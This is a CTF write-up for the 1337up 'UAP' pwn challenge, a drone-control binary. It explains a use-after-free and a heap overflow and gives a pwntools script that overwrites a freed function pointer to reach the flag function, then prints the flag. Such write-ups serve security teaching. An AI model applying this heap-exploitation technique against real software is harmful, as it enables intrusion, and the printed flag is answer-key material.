You can download challenge in [here](https://github.com/q11N9/CTF_Writeups/blob/main/CTFpwn/1337up-live-ctf/pwn/UAP/uap.zip). 

The program prints out a menu to control the drone: 

![image](https://hackmd.io/_uploads/H1JDdXBzyg.png)

- **deploy_drone()**:

![image](https://hackmd.io/_uploads/B1qd_XHzyg.png)

The function will malloc a chunk of size 0x30 (including metadata), with ready status and **start_route** and **end_route**

- **retire_drone()**:

![image](https://hackmd.io/_uploads/rkE5OQrzye.png)

When the function will free the memory of a drone, use the **end_route()** function to free:

![image](https://hackmd.io/_uploads/Sy9ZtmHM1x.png)

We have a UAF bug here.


- **start_drone_route()**:

![image](https://hackmd.io/_uploads/rk4hdQSzkg.png)

The function just prints out the current route of the drone using the **start_route()** function:

![image](https://hackmd.io/_uploads/ByYkKmrfJe.png)

- Hàm **enter_drone_route()**:

![image](https://hackmd.io/_uploads/By_pdXBMJe.png)

The function will malloc with size 0x30 and let us enter data. But here it lets us enter 89 bytes, when the chunk size is only 48 bytes. So we have a buffer overflow bug here.

- **print_drone_manual()** gives us flag:

![image](https://hackmd.io/_uploads/H1KLF7SGyl.png)

When debugging in gdb, we will see the structure of a drone after free will be as follows:

![image](https://hackmd.io/_uploads/rk7fqFBGJg.png)
![image](https://hackmd.io/_uploads/HkiG5YSGkg.png)
![image](https://hackmd.io/_uploads/SJtVcFSfyx.png)

In turn, it will be id -> status->start_route -> end_route.
Let's try to insert 89 characters into a drone and let it start the route:

![image](https://hackmd.io/_uploads/r1uPN9Bzyg.png)

![image](https://hackmd.io/_uploads/Sk_LE5SGyl.png)

There is a call to rax, but our rax is now like this:

![image](https://hackmd.io/_uploads/Bkf_N9HzJg.png)

If we calculate according to the offset of the payload, the called address will have a padding of 16. So we will have the following script:

```python!
#!/usr/bin/env python3

from pwn import *

exe = ELF("./drone_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("uap.ctf.intigriti.io", 1340)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    # Create drone
    r.sendline(b'1')
    pause()
    # Retire Drone
    r.sendline(b'2')
    r.sendline(b'1')
    r.recvline()
    pause()
    # Edit data in freed drone
    r.sendline(b'4')
    r.sendline(b'A'* 16 + p64(0x400836))
    pause()
    # Start its route to trigger
    r.sendline(b'3')
    r.sendline(b'1')
    pause()
    r.interactive()


if __name__ == "__main__":
    main()

```
Run on local: 

![image](https://hackmd.io/_uploads/Hk6CVcBGyx.png)

Run on server: 

![image](https://hackmd.io/_uploads/S1GgScrfkl.png)

Flag: ```INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}```
